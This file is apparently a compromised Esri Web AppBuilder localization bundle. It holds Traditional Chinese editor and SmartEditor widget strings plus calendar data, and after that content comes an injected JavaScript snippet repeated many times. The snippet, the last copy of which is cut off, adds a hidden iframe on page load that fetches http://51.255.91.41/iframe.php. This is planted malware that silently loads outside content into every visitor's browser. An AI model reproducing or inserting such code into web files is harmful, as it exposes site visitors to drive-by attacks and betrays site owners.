// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"dijit/_editor/nls/commands":{bold:"\u7c97\u9ad4",copy:"\u8907\u88fd",cut:"\u526a\u4e0b","delete":"\u522a\u9664",indent:"\u7e2e\u6392",insertHorizontalRule:"\u6c34\u5e73\u5c3a\u898f",insertOrderedList:"\u7de8\u865f\u6e05\u55ae",insertUnorderedList:"\u9805\u76ee\u7b26\u865f\u6e05\u55ae",italic:"\u659c\u9ad4",justifyCenter:"\u7f6e\u4e2d\u5c0d\u9f4a",justifyFull:"\u5c0d\u9f4a",justifyLeft:"\u9760\u5de6\u5c0d\u9f4a",justifyRight:"\u9760\u53f3\u5c0d\u9f4a",outdent:"\u51f8\u6392",paste:"\u8cbc\u4e0a",
redo:"\u91cd\u505a",removeFormat:"\u79fb\u9664\u683c\u5f0f",selectAll:"\u5168\u9078",strikethrough:"\u522a\u9664\u7dda",subscript:"\u4e0b\u6a19",superscript:"\u4e0a\u6a19",underline:"\u5e95\u7dda",undo:"\u5fa9\u539f",unlink:"\u79fb\u9664\u93c8\u7d50",createLink:"\u5efa\u7acb\u93c8\u7d50",toggleDir:"\u5207\u63db\u65b9\u5411",insertImage:"\u63d2\u5165\u5f71\u50cf",insertTable:"\u63d2\u5165/\u7de8\u8f2f\u8868\u683c",toggleTableBorder:"\u5207\u63db\u8868\u683c\u908a\u6846",deleteTable:"\u522a\u9664\u8868\u683c",
tableProp:"\u8868\u683c\u5167\u5bb9",htmlToggle:"HTML \u539f\u59cb\u6a94",foreColor:"\u524d\u666f\u984f\u8272",hiliteColor:"\u80cc\u666f\u984f\u8272",plainFormatBlock:"\u6bb5\u843d\u6a23\u5f0f",formatBlock:"\u6bb5\u843d\u6a23\u5f0f",fontSize:"\u5b57\u578b\u5927\u5c0f",fontName:"\u5b57\u578b\u540d\u7a31",tabIndent:"\u6a19\u7c64\u7e2e\u6392",fullScreen:"\u5207\u63db\u5168\u87a2\u5e55",viewSource:"\u6aa2\u8996 HTML \u539f\u59cb\u6a94",print:"\u5217\u5370",newPage:"\u65b0\u9801\u9762",systemShortcut:'"${0}" \u52d5\u4f5c\u5728\u60a8\u7684\u700f\u89bd\u5668\u4e2d\uff0c\u53ea\u80fd\u4f7f\u7528\u9375\u76e4\u5feb\u901f\u9375\u3002\u8acb\u4f7f\u7528 ${1}\u3002',
ctrlKey:"ctrl+${0}",appleKey:"\u2318${0}",_localized:{}},"dijit/_editor/nls/FontChoice":{fontSize:"\u5927\u5c0f",fontName:"\u5b57\u578b",formatBlock:"\u683c\u5f0f",serif:"\u65b0\u7d30\u660e\u9ad4","sans-serif":"\u65b0\u7d30\u660e\u9ad4",monospace:"\u7b49\u5bec",cursive:"Cursive",fantasy:"Fantasy",noFormat:"\u7121",p:"\u6bb5\u843d",h1:"\u6a19\u984c",h2:"\u5b50\u6a19\u984c",h3:"\u6b21\u5b50\u6a19\u984c",pre:"\u9810\u5148\u683c\u5f0f\u5316",1:"\u6700\u5c0f",2:"\u8f03\u5c0f",3:"\u5c0f",4:"\u4e2d",5:"\u5927",
6:"\u8f03\u5927",7:"\u6700\u5927",_localized:{}},"dojox/editor/plugins/nls/Preview":{preview:"\u9810\u89bd",_localized:{}},"dojox/editor/plugins/nls/FindReplace":{findLabel:"\u5c0b\u627e\uff1a",findTooltip:"\u8f38\u5165\u8981\u5c0b\u627e\u7684\u6587\u5b57",replaceLabel:"\u53d6\u4ee3\u70ba\uff1a",replaceTooltip:"\u8f38\u5165\u8981\u53d6\u4ee3\u7684\u6587\u5b57",findReplace:"\u5c0b\u627e/\u53d6\u4ee3",matchCase:"\u5927\u5c0f\u5beb\u76f8\u7b26",matchCaseTooltip:"\u5927\u5c0f\u5beb\u76f8\u7b26",backwards:"\u5411\u5f8c",
backwardsTooltip:"\u5f80\u56de\u641c\u5c0b\u6587\u5b57",replaceAllButton:"\u5168\u90e8\u53d6\u4ee3",replaceAllButtonTooltip:"\u53d6\u4ee3\u6240\u6709\u6587\u5b57",findButton:"\u5c0b\u627e",findButtonTooltip:"\u5c0b\u627e\u6587\u5b57",replaceButton:"\u53d6\u4ee3",replaceButtonTooltip:"\u53d6\u4ee3\u6587\u5b57",replaceDialogText:"\u53d6\u4ee3\u4e86 ${0} \u9805\u3002",eofDialogText:"\u524d\u6b21\u51fa\u73fe ${0}",eofDialogTextFind:"\u627e\u5230",eofDialogTextReplace:"\u5df2\u53d6\u4ee3",_localized:{}},
"dojox/editor/plugins/nls/PasteFromWord":{pasteFromWord:"\u5f9e Word \u8cbc\u4e0a",instructions:"\u5c07 Word \u4e2d\u7684\u5167\u5bb9\u8cbc\u5165\u4e0b\u65b9\u7684\u6587\u5b57\u6846\u3002\u5728\u6eff\u610f\u8981\u63d2\u5165\u7684\u5167\u5bb9\u4e4b\u5f8c\uff0c\u8acb\u6309\u8cbc\u4e0a\u6309\u9215\u3002\u82e5\u8981\u4e2d\u65b7\u63d2\u5165\u6587\u5b57\uff0c\u8acb\u6309\u53d6\u6d88\u6309\u9215\u3002",_localized:{}},"dojox/editor/plugins/nls/InsertAnchor":{insertAnchor:"\u63d2\u5165\u9328\u9ede",title:"\u9328\u9ede\u5167\u5bb9",
anchor:"\u540d\u7a31\uff1a",text:"\u8aaa\u660e\uff1a",set:"\u8a2d\u5b9a",cancel:"\u53d6\u6d88",_localized:{}},"dojox/editor/plugins/nls/Blockquote":{blockquote:"\u5340\u584a\u5f15\u6587",_localized:{}},"dojo/cldr/nls/islamic":{"dateFormatItem-Ehm":"E h:mm a","days-standAlone-short":"\u5468\u65e5 \u5468\u4e00 \u5468\u4e8c \u5468\u4e09 \u5468\u56db \u5468\u4e94 \u5468\u516d".split(" "),"months-format-narrow":"1 2 3 4 5 6 7 8 9 10 11 12".split(" "),"field-second-relative+0":"\u73b0\u5728","quarters-standAlone-narrow":["1",
"2","3","4"],"field-weekday":"\u5de5\u4f5c\u65e5","field-wed-relative+0":"\u672c\u5468\u4e09","field-wed-relative+1":"\u4e0b\u5468\u4e09","dateFormatItem-GyMMMEd":"Gy\u5e74M\u6708d\u65e5E","dateFormatItem-MMMEd":"M\u6708d\u65e5E",eraNarrow:["\u56de\u5386"],"field-tue-relative+-1":"\u4e0a\u5468\u4e8c","days-format-short":"\u5468\u65e5 \u5468\u4e00 \u5468\u4e8c \u5468\u4e09 \u5468\u56db \u5468\u4e94 \u5468\u516d".split(" "),"dateTimeFormats-appendItem-Day-Of-Week":"{0} {1}","dateFormat-long":"Gy\u5e74M\u6708d\u65e5",
"field-fri-relative+-1":"\u4e0a\u5468\u4e94","field-wed-relative+-1":"\u4e0a\u5468\u4e09","months-format-wide":"\u4e00\u6708 \u4e8c\u6708 \u4e09\u6708 \u56db\u6708 \u4e94\u6708 \u516d\u6708 \u4e03\u6708 \u516b\u6708 \u4e5d\u6708 \u5341\u6708 \u5341\u4e00\u6708 \u5341\u4e8c\u6708".split(" "),"dateFormatItem-yyyyQQQ":"Gy\u5e74\u7b2cQ\u5b63\u5ea6","dateTimeFormat-medium":"{1} {0}","dayPeriods-format-wide-pm":"\u4e0b\u5348","dateFormat-full":"Gy\u5e74M\u6708d\u65e5EEEE","dateFormatItem-yyyyMEd":"Gy/M/dE",
"field-thu-relative+-1":"\u4e0a\u5468\u56db","dateFormatItem-Md":"M-d","dayPeriods-format-abbr-am":"AM","dateTimeFormats-appendItem-Second":"{0} ({2}: {1})","dayPeriods-format-wide-noon":"\u4e2d\u5348","field-era":"\u7eaa\u5143","months-standAlone-wide":"\u4e00\u6708 \u4e8c\u6708 \u4e09\u6708 \u56db\u6708 \u4e94\u6708 \u516d\u6708 \u4e03\u6708 \u516b\u6708 \u4e5d\u6708 \u5341\u6708 \u5341\u4e00\u6708 \u5341\u4e8c\u6708".split(" "),"timeFormat-short":"ah:mm","quarters-format-wide":["\u7b2c\u4e00\u5b63\u5ea6",
"\u7b2c\u4e8c\u5b63\u5ea6","\u7b2c\u4e09\u5b63\u5ea6","\u7b2c\u56db\u5b63\u5ea6"],"timeFormat-long":"z ah:mm:ss","field-year":"\u5e74","dateTimeFormats-appendItem-Era":"{1} {0}","field-hour":"\u5c0f\u65f6","months-format-abbr":"1\u6708 2\u6708 3\u6708 4\u6708 5\u6708 6\u6708 7\u6708 8\u6708 9\u6708 10\u6708 11\u6708 12\u6708".split(" "),"field-sat-relative+0":"\u672c\u5468\u516d","field-sat-relative+1":"\u4e0b\u5468\u516d","timeFormat-full":"zzzz ah:mm:ss","dateTimeFormats-appendItem-Week":"{0} ({2}: {1})",
"field-day-relative+0":"\u4eca\u5929","field-thu-relative+0":"\u672c\u5468\u56db","field-day-relative+1":"\u660e\u5929","field-thu-relative+1":"\u4e0b\u5468\u56db","dateFormatItem-GyMMMd":"Gy\u5e74M\u6708d\u65e5","dateFormatItem-H":"H\u65f6","months-standAlone-abbr":"1\u6708 2\u6708 3\u6708 4\u6708 5\u6708 6\u6708 7\u6708 8\u6708 9\u6708 10\u6708 11\u6708 12\u6708".split(" "),"quarters-format-abbr":["1\u5b63\u5ea6","2\u5b63\u5ea6","3\u5b63\u5ea6","4\u5b63\u5ea6"],"quarters-standAlone-wide":["\u7b2c\u4e00\u5b63\u5ea6",
"\u7b2c\u4e8c\u5b63\u5ea6","\u7b2c\u4e09\u5b63\u5ea6","\u7b2c\u56db\u5b63\u5ea6"],"dateFormatItem-Gy":"Gy\u5e74","dateFormatItem-yyyyMMMEd":"Gy\u5e74M\u6708d\u65e5E","dateFormatItem-M":"M\u6708","days-standAlone-wide":"\u661f\u671f\u65e5 \u661f\u671f\u4e00 \u661f\u671f\u4e8c \u661f\u671f\u4e09 \u661f\u671f\u56db \u661f\u671f\u4e94 \u661f\u671f\u516d".split(" "),"dateFormatItem-yyyyMMM":"Gy\u5e74M\u6708","dateFormatItem-yyyyMMMd":"Gy\u5e74M\u6708d\u65e5","dayPeriods-format-abbr-noon":"noon","timeFormat-medium":"ah:mm:ss",
"field-sun-relative+0":"\u672c\u5468\u65e5","dateFormatItem-Hm":"HH:mm","field-sun-relative+1":"\u4e0b\u5468\u65e5","quarters-standAlone-abbr":["1\u5b63\u5ea6","2\u5b63\u5ea6","3\u5b63\u5ea6","4\u5b63\u5ea6"],eraAbbr:["\u56de\u5386"],"field-minute":"\u5206\u949f","field-dayperiod":"\u4e0a\u5348/\u4e0b\u5348","days-standAlone-abbr":"\u5468\u65e5 \u5468\u4e00 \u5468\u4e8c \u5468\u4e09 \u5468\u56db \u5468\u4e94 \u5468\u516d".split(" "),"dateFormatItem-d":"d\u65e5","dateFormatItem-ms":"mm:ss","quarters-format-narrow":["1",
"2","3","4"],"field-day-relative+-1":"\u6628\u5929","dateTimeFormat-long":"{1} {0}","dayPeriods-format-narrow-am":"\u4e0a\u5348","dateFormatItem-h":"ah\u65f6","dateFormatItem-MMMd":"M\u6708d\u65e5","dateFormatItem-MEd":"M-dE","dateTimeFormat-full":"{1} {0}","field-fri-relative+0":"\u672c\u5468\u4e94","field-fri-relative+1":"\u4e0b\u5468\u4e94","field-day":"\u65e5","days-format-wide":"\u661f\u671f\u65e5 \u661f\u671f\u4e00 \u661f\u671f\u4e8c \u661f\u671f\u4e09 \u661f\u671f\u56db \u661f\u671f\u4e94 \u661f\u671f\u516d".split(" "),
"field-zone":"\u65f6\u533a","months-standAlone-narrow":"1 2 3 4 5 6 7 8 9 10 11 12".split(" "),"dateFormatItem-y":"Gy\u5e74","dateTimeFormats-appendItem-Day":"{0} ({2}: {1})","field-year-relative+-1":"\u53bb\u5e74","field-month-relative+-1":"\u4e0a\u4e2a\u6708","dateTimeFormats-appendItem-Year":"{1} {0}","dateFormatItem-hm":"ah:mm","dateTimeFormats-appendItem-Hour":"{0} ({2}: {1})","dayPeriods-format-abbr-pm":"PM","days-format-abbr":"\u5468\u65e5 \u5468\u4e00 \u5468\u4e8c \u5468\u4e09 \u5468\u56db \u5468\u4e94 \u5468\u516d".split(" "),
eraNames:["\u56de\u5386"],"days-format-narrow":"\u65e5\u4e00\u4e8c\u4e09\u56db\u4e94\u516d".split(""),"dateFormatItem-yyyyMd":"Gy/M/d","field-month":"\u6708","days-standAlone-narrow":"\u65e5\u4e00\u4e8c\u4e09\u56db\u4e94\u516d".split(""),"dateFormatItem-MMM":"LLL","field-tue-relative+0":"\u672c\u5468\u4e8c","field-tue-relative+1":"\u4e0b\u5468\u4e8c","dateTimeFormats-appendItem-Quarter":"{0} ({2}: {1})","dayPeriods-format-wide-am":"\u4e0a\u5348","dateTimeFormats-appendItem-Month":"{0} ({2}: {1})",
"dateTimeFormats-appendItem-Minute":"{0} ({2}: {1})","dateFormatItem-EHm":"E HH:mm","field-mon-relative+0":"\u672c\u5468\u4e00","field-mon-relative+1":"\u4e0b\u5468\u4e00","dateFormat-short":"Gy/M/d","dateFormatItem-EHms":"E HH:mm:ss","dateFormatItem-Ehms":"E h:mm:ss a","dayPeriods-format-narrow-noon":"\u4e2d\u5348","field-second":"\u79d2\u949f","field-sat-relative+-1":"\u4e0a\u5468\u516d","field-sun-relative+-1":"\u4e0a\u5468\u65e5","field-month-relative+0":"\u672c\u6708","field-month-relative+1":"\u4e0b\u4e2a\u6708",
"dateTimeFormats-appendItem-Timezone":"{0} {1}","dateFormatItem-Ed":"d\u65e5E","field-week":"\u5468","dateFormat-medium":"Gy\u5e74M\u6708d\u65e5","field-week-relative+-1":"\u4e0a\u5468","field-year-relative+0":"\u4eca\u5e74","dateFormatItem-yyyyM":"Gy\u5e74M\u6708","field-year-relative+1":"\u660e\u5e74","dayPeriods-format-narrow-pm":"\u4e0b\u5348","dateFormatItem-yyyyQQQQ":"Gy\u5e74\u7b2cQ\u5b63\u5ea6","dateTimeFormat-short":"{1} {0}","dateFormatItem-Hms":"HH:mm:ss","dateFormatItem-hms":"ah:mm:ss",
"dateFormatItem-GyMMM":"Gy\u5e74M\u6708","field-mon-relative+-1":"\u4e0a\u5468\u4e00","dateFormatItem-yyyy":"Gy\u5e74","field-week-relative+0":"\u672c\u5468","field-week-relative+1":"\u4e0b\u5468","field-day-relative+2":"\u540e\u5929","field-day-relative+-2":"\u524d\u5929",_localized:{}},"widgets/SmartEditor/setting/nls/strings":{layersPage:{title:"\u9078\u64c7\u7bc4\u672c\u4ee5\u5efa\u7acb\u5716\u5fb5",generalSettings:"\u4e00\u822c\u8a2d\u5b9a",layerSettings:"\u5716\u5c64\u8a2d\u5b9a",editDescription:"\u63d0\u4f9b\u7de8\u8f2f\u9762\u677f\u7684\u986f\u793a\u6587\u5b57",
editDescriptionTip:"\u6b64\u6587\u5b57\u6703\u986f\u793a\u5728\u300c\u7bc4\u672c\u300d\u9078\u53d6\u5668\u4e0a\u65b9\uff0c\u7559\u7a7a\u5247\u7121\u6587\u5b57\u3002",promptOnSave:"\u7576\u8868\u55ae\u95dc\u9589\u6216\u5207\u63db\u81f3\u4e0b\u4e00\u7b46\u8a18\u9304\u6642\uff0c\u7cfb\u7d71\u6703\u63d0\u793a\u60a8\u5132\u5b58\u672a\u5132\u5b58\u7684\u7de8\u8f2f\u5167\u5bb9\u3002",promptOnSaveTip:"\u7576\u76ee\u524d\u7684\u5716\u5fb5\u6709\u5c1a\u672a\u5132\u5b58\u7684\u7de8\u8f2f\u5167\u5bb9\u6642\uff0c\u82e5\u4f7f\u7528\u8005\u6309\u4e00\u4e0b\u95dc\u9589\u6216\u700f\u89bd\u5230\u4e0b\u4e00\u7b46\u53ef\u7de8\u8f2f\u8a18\u9304\uff0c\u5247\u6703\u51fa\u73fe\u63d0\u793a\u3002",
promptOnDelete:"\u522a\u9664\u8a18\u9304\u6642\u9700\u8981\u78ba\u8a8d\u3002",promptOnDeleteTip:"\u7576\u4f7f\u7528\u8005\u6309\u4e00\u4e0b\u522a\u9664\u4ee5\u78ba\u8a8d\u52d5\u4f5c\u6642\u6703\u51fa\u73fe\u63d0\u793a\u3002",removeOnSave:"\u5132\u5b58\u6642\u5f9e\u9078\u64c7\u4e2d\u79fb\u9664\u5716\u5fb5\u3002",removeOnSaveTip:"\u5132\u5b58\u8a18\u9304\u6642\uff0c\u7528\u4f86\u5f9e\u9078\u64c7\u96c6\u4e2d\u79fb\u9664\u5716\u5fb5\u7684\u9078\u9805\u3002\u5982\u679c\u50c5\u9078\u64c7\u8a72\u8a18\u9304\uff0c\u9762\u677f\u6703\u5207\u63db\u56de\u7bc4\u672c\u9801\u9762\u3002",
useFilterEditor:"\u4f7f\u7528\u5716\u5fb5\u7bc4\u672c\u7be9\u9078\u5668",useFilterEditorTip:"\u7528\u4f86\u4f7f\u7528\u300c\u7be9\u9078\u7bc4\u672c\u300d\u9078\u53d6\u5668\u7684\u9078\u9805\uff0c\u53ef\u8b93\u60a8\u6aa2\u8996\u4e00\u500b\u5716\u5c64\u7bc4\u672c\u6216\u6309\u540d\u7a31\u641c\u5c0b\u7bc4\u672c\u3002",displayShapeSelector:"\u986f\u793a\u7e6a\u88fd\u9078\u9805",displayShapeSelectorTip:"\u7528\u4f86\u986f\u793a\u6240\u9078\u6a23\u677f\u7684\u6709\u6548\u7e6a\u88fd\u9078\u9805\u6e05\u55ae\u7684\u9078\u9805\u3002",
displayPresetTop:"\u5728\u9802\u7aef\u986f\u793a\u9810\u8a2d\u503c\u6e05\u55ae",displayPresetTopTip:"\u5728\u6a23\u7248\u9078\u53d6\u5668\u4e0a\u65b9\u7528\u4f86\u986f\u793a\u9810\u8a2d\u503c\u6e05\u55ae\u7684\u9078\u9805\u3002",listenToGroupFilter:"\u5c07\u7be9\u9078\u5668\u503c\u5f9e\u300c\u7fa4\u7d44\u7be9\u9078\u5668\u300dwidget \u5957\u7528\u81f3\u300c\u9810\u8a2d\u300d\u6b04\u4f4d",listenToGroupFilterTip:"\u5728\u300c\u7fa4\u7d44\u7be9\u9078\u5668\u300dwidget \u4e2d\u5957\u7528\u7be9\u9078\u5668\u6642\uff0c\u5c07\u503c\u5957\u7528\u81f3\u300c\u9810\u8a2d\u300d\u503c\u6e05\u55ae\u4e2d\u7684\u7b26\u5408\u6b04\u4f4d\u3002",
keepTemplateActive:"\u7dad\u6301\u6240\u9078\u6a23\u7248\u4f7f\u7528\u4e2d",keepTemplateActiveTip:"\u986f\u793a\u6a23\u7248\u9078\u53d6\u5668\u6642\uff0c\u5982\u679c\u5148\u524d\u5df2\u9078\u64c7\u6a23\u7248\uff0c\u8acb\u91cd\u65b0\u9078\u64c7\u5b83\u3002",geometryEditDefault:"\u9810\u8a2d\u6703\u555f\u7528\u5e7e\u4f55\u7de8\u8f2f",autoSaveEdits:"\u81ea\u52d5\u5132\u5b58\u7de8\u8f2f\u5167\u5bb9",layerSettingsTable:{allowDelete:"\u5141\u8a31\u522a\u9664",allowDeleteTip:"\u7528\u4f86\u5141\u8a31\u4f7f\u7528\u8005\u522a\u9664\u5716\u5fb5\u7684\u9078\u9805\uff1b\u5982\u679c\u5716\u5c64\u4e0d\u652f\u63f4\u522a\u9664\u5247\u505c\u7528",
edit:"\u53ef\u7de8\u8f2f",editTip:"\u5728 widget \u4e2d\u7528\u4f86\u52a0\u5165\u5716\u5c64\u7684\u9078\u9805",label:"\u5716\u5c64",labelTip:"\u5730\u5716\u4e2d\u5b9a\u7fa9\u4e4b\u5716\u5c64\u7684\u540d\u7a31",update:"\u505c\u7528\u5e7e\u4f55\u7de8\u8f2f",updateTip:"\u7528\u4f86\u505c\u7528\u653e\u7f6e\u5f8c\u79fb\u52d5\u5e7e\u4f55\uff0c\u6216\u79fb\u52d5\u73fe\u6709\u5716\u5fb5\u4e0a\u5e7e\u4f55\u7684\u80fd\u529b",allowUpdateOnly:"\u50c5\u66f4\u65b0",allowUpdateOnlyTip:"\u7528\u65bc\u50c5\u5141\u8a31\u4fee\u6539\u73fe\u6709\u5716\u5fb5\u7684\u9078\u9805 (\u9810\u8a2d\u70ba\u555f\u7528)\uff0c\u82e5\u5716\u5c64\u4e0d\u652f\u63f4\u5efa\u7acb\u65b0\u5716\u5fb5\u5247\u505c\u7528",
fields:"\u6b04\u4f4d",fieldsTip:"\u4fee\u6539\u8981\u7de8\u8f2f\u7684\u6b04\u4f4d\u53ca\u5b9a\u7fa9\u667a\u6167\u5c6c\u6027",description:"\u8aaa\u660e",descriptionTip:"\u53ef\u7528\u4f86\u8f38\u5165\u6587\u5b57\uff0c\u4ee5\u4fbf\u5728\u5c6c\u6027\u9801\u9762\u9802\u7aef\u986f\u793a\u8a72\u6587\u5b57\u7684\u9078\u9805\u3002"},editFieldError:"\u6b04\u4f4d\u4fee\u6539\u548c\u667a\u6167\u5c6c\u6027\u4e0d\u9069\u7528\u65bc\u7121\u6cd5\u7de8\u8f2f\u7684\u5716\u5c64",noConfigedLayersError:"\u300c\u667a\u6167\u578b\u7de8\u8f2f\u5668\u300d\u9700\u8981\u4e00\u6216\u591a\u500b\u53ef\u7de8\u8f2f\u5716\u5c64"},
editDescriptionPage:{title:"\u5b9a\u7fa9 \x3cb\x3e${layername}\x3c/b\x3e \u7684\u5c6c\u6027\u6982\u89c0\u6587\u5b57\u3002 "},fieldsPage:{title:"\u914d\u7f6e \x3cb\x3e${layername}\x3c/b\x3e \u7684\u6b04\u4f4d",description:"\u4f7f\u7528\u300c\u9810\u8a2d\u300d\u6b04\uff0c\u5141\u8a31\u4f7f\u7528\u8005\u5148\u8f38\u5165\u503c\u518d\u5efa\u7acb\u65b0\u5716\u5fb5\u3002\u4f7f\u7528\u300c\u52d5\u4f5c\u300d\u7de8\u8f2f\u6309\u9215\u53ef\u5728\u5716\u5c64\u4e0a\u555f\u52d5\u300c\u667a\u6167\u5c6c\u6027\u300d\u3002\u300c\u667a\u6167\u5c6c\u6027\u300d\u53ef\u6839\u64da\u5176\u4ed6\u6b04\u4f4d\u4e2d\u7684\u503c\u4f86\u53d6\u5f97\u3001\u96b1\u85cf\u6216\u505c\u7528\u6b04\u4f4d\u3002",
fieldsNotes:"* \u662f\u5fc5\u8981\u6b04\u4f4d\u3002\u82e5\u70ba\u6b64\u6b04\u4f4d\u53d6\u6d88\u52fe\u9078\u300c\u986f\u793a\u300d\uff0c\u4e14\u7de8\u8f2f\u7bc4\u672c\u672a\u586b\u5165\u8a72\u6b04\u4f4d\u503c\uff0c\u60a8\u5c31\u7121\u6cd5\u5132\u5b58\u65b0\u8a18\u9304\u3002",fieldsSettingsTable:{display:"\u986f\u793a",displayTip:"\u6c7a\u5b9a\u662f\u5426\u96b1\u85cf\u6b04\u4f4d",edit:"\u53ef\u7de8\u8f2f",editTip:"\u6aa2\u67e5\u6b04\u4f4d\u662f\u5426\u51fa\u73fe\u5728\u5c6c\u6027\u8868\u55ae\u4e2d",
fieldName:"\u540d\u7a31",fieldNameTip:"\u8cc7\u6599\u5eab\u4e2d\u5b9a\u7fa9\u4e4b\u6b04\u4f4d\u7684\u540d\u7a31",fieldAlias:"\u5225\u540d",fieldAliasTip:"\u5730\u5716\u4e2d\u5b9a\u7fa9\u4e4b\u6b04\u4f4d\u7684\u540d\u7a31",canPresetValue:"\u9810\u7f6e",canPresetValueTip:"\u7528\u65bc\u986f\u793a\u9810\u8a2d\u6b04\u4f4d\u6e05\u55ae\u4e2d\u7684\u6b04\u4f4d\uff0c\u4e26\u5141\u8a31\u4f7f\u7528\u8005\u5148\u8a2d\u5b9a\u503c\u518d\u9032\u884c\u7de8\u8f2f\u7684\u9078\u9805",actions:"\u64cd\u4f5c",actionsTip:"\u8b8a\u66f4\u6b04\u4f4d\u7684\u9806\u5e8f\u6216\u8a2d\u5b9a\u667a\u6167\u5c6c\u6027"},
smartAttSupport:"\u667a\u6167\u5c6c\u6027\u5728\u5fc5\u8981\u7684\u8cc7\u6599\u5eab\u6b04\u4f4d\u4e0a\u4e0d\u53d7\u652f\u63f4"},actionPage:{title:"\u914d\u7f6e \x3cb\x3e${fieldname}\x3c/b\x3e \u7684\u667a\u6167\u5c6c\u6027\u52d5\u4f5c",description:"\u9664\u975e\u6307\u5b9a\u5c07\u89f8\u767c\u52d5\u4f5c\u7684\u6e96\u5247\uff0c\u5426\u5247\u4e00\u5f8b\u6703\u95dc\u9589\u52d5\u4f5c\u3002\u6703\u6309\u9806\u5e8f\u8655\u7406\u52d5\u4f5c\uff0c\u4e14\u53ea\u6703\u91dd\u5c0d\u4e00\u500b\u6b04\u4f4d\u89f8\u767c\u4e00\u500b\u52d5\u4f5c\u3002\u4f7f\u7528\u300c\u6e96\u5247\u7de8\u8f2f\u300d\u6309\u9215\u4f86\u5b9a\u7fa9\u6e96\u5247\u3002",
actionsSettingsTable:{rule:"\u64cd\u4f5c",ruleTip:"\u6eff\u8db3\u6e96\u5247\u6642\u57f7\u884c\u7684\u52d5\u4f5c",expression:"\u8868\u9054\u5f0f",expressionTip:"\u5f9e\u5b9a\u7fa9\u7684\u6e96\u5247\u4e2d\u5c0e\u51fa\u7684 SQL \u683c\u5f0f\u7684\u8868\u9054\u5f0f",actions:"\u6e96\u5247",actionsTip:"\u8b8a\u66f4\u898f\u5247\u7684\u9806\u5e8f\u548c\u5b9a\u7fa9\u89f8\u767c\u6642\u7684\u6e96\u5247"},actions:{hide:"\u96b1\u85cf",required:"\u5fc5\u586b\u8cc7\u8a0a",disabled:"\u5df2\u505c\u7528"}},filterPage:{submitHidden:"\u63d0\u4ea4\u6b64\u6b04\u4f4d\u7684\u5c6c\u6027\u8cc7\u6599\uff0c\u5373\u4f7f\u5728\u96b1\u85cf\u6642\u4e5f\u662f\u5982\u6b64?",
title:"\u914d\u7f6e ${action} \u898f\u5247\u7684\u8868\u9054\u5f0f",filterBuilder:"\u5728\u6b04\u4f4d\u4e0a\u8a2d\u5b9a\u7576\u8a18\u9304\u7b26\u5408\u4e0b\u5217\u8868\u9054\u5f0f\u7684 ${any_or_all} \u6642\u7684\u52d5\u4f5c",noFilterTip:"\u4f7f\u7528\u4e0b\u5217\u5de5\u5177\u4f86\u5b9a\u7fa9\u555f\u7528\u52d5\u4f5c\u7684\u9673\u8ff0\u5f0f\u3002"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
